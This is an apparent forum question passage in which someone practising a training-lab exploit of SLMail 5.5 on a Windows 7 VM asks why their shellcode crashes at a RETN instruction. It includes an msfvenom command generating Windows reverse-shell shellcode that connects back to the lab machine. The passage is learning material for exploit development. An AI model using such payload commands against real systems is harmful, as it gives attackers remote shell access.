Even Google doesn't know what this error means. The last command causing program termination is <code>C3</code>, or opcode <code>RETN</code>, so it must have something to do with the stack. This op, that is causing the crash is part of my shell code, which I have generated as follows:</p>\n<pre><code>msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=&lt;PWK VM IP&gt; LPORT=443 -b '\\x00\\x0a\\x0d' -f c \n</code></pre>\n<p>The SLMail is a default setup of 5.5 on a 32-bit windows 7 VM. I've been stuck here for over a week, so <em>please</em> do help as much as possible.</p>\n</div>",
